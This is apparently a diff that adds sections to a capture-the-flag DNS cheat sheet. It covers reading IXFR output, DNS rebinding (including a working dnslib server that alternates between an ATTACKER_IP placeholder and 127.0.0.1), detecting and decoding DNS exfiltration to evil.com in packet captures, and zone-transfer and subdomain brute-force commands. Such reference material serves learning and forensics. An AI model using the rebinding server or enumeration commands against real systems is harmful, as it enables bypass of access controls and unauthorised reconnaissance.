@@ -58,3 +58,96 @@ def walk_nsec(server, port, base_domain):
 dig @server -p 5054 flag.example.com IXFR=0
 # Look for historical TXT records in the diff output
 ```
+
+**IXFR output format:** The diff shows pairs of SOA records bracketing additions/deletions. Records between the old SOA and new SOA were removed; records after new SOA were added. Deleted TXT records often contain flag fragments.
+
+---
+
+## DNS Rebinding
+
+**Pattern:** Bypass same-origin or IP-based access controls by making a DNS name resolve to different IPs over time.
+
+**How it works:**
+1. Attacker controls DNS for `evil.com` with very low TTL (e.g., 1 second)
+2. First resolution: `evil.com` -> attacker's IP (serves malicious JS)
+3. Second resolution: `evil.com` -> `127.0.0.1` (or internal IP)
+4. Browser's same-origin policy allows JS on `evil.com` to access the new IP
+
+```python
+# Simple DNS rebinding server (Python + dnslib)
+from dnslib import DNSRecord, RR, A
+from dnslib.server import DNSServer, BaseResolver
+
+class RebindResolver(BaseResolver):
+    def __init__(self):
+        self.count = {}
+
+    def resolve(self, request, handler):
+        qname = str(request.q.qname)
+        self.count[qname] = self.count.get(qname, 0) + 1
+        reply = request.reply()
+
+        if self.count[qname] % 2 == 1:
+            reply.add_answer(RR(qname, rdata=A("ATTACKER_IP"), ttl=1))
+        else:
+            reply.add_answer(RR(qname, rdata=A("127.0.0.1"), ttl=1))
+        return reply
+```
+
+**Tools:** [rbndr.us](http://rbndr.us/) for quick rebinding without custom DNS, [singularity](https://github.com/nccgroup/singularity) for automated attacks.
+
+---
+
+## DNS Tunneling / Exfiltration
+
+**Pattern:** Data exfiltrated via DNS queries (subdomains) or responses (TXT records).
+
+**Detection in PCAPs:**
+```bash
+# Extract DNS queries from pcap
+tshark -r capture.pcap -Y "dns.qry.type == 1" \
+    -T fields -e dns.qry.name | sort -u
+
+# Look for encoded subdomains (hex, base32, base64url)
+tshark -r capture.pcap -Y "dns.qry.name contains '.evil.com'" \
+    -T fields -e dns.qry.name
+```
+
+**Decoding exfiltrated data:**
+```python
+import base64
+
+# Subdomain-based exfil: data.chunk1.evil.com, data.chunk2.evil.com
+queries = [...]  # extracted DNS query names
+chunks = [q.split('.')[0] for q in queries if q.endswith('.evil.com')]
+decoded = base64.b32decode(''.join(chunks).upper() + '====')
+print(decoded)
+```
+
+**DNS-based C2 in PCAPs:**
+```bash
+tshark -r capture.pcap -Y "dns.qry.type == 16" \
+    -T fields -e dns.qry.name -e dns.txt
+```
+
+---
+
+## DNS Enumeration Quick Reference
+
+```bash
+# Standard zone transfer attempt
+dig @ns.target.com target.com AXFR
+
+# Brute-force subdomains
+for sub in $(cat wordlist.txt); do
+    dig +short "$sub.target.com" && echo "$sub"
+done
+
+# Reverse DNS sweep
+for i in $(seq 1 254); do
+    dig +short -x 10.0.0.$i
+done
+
+# Check for wildcard DNS
+dig randomnonexistent.target.com
+```
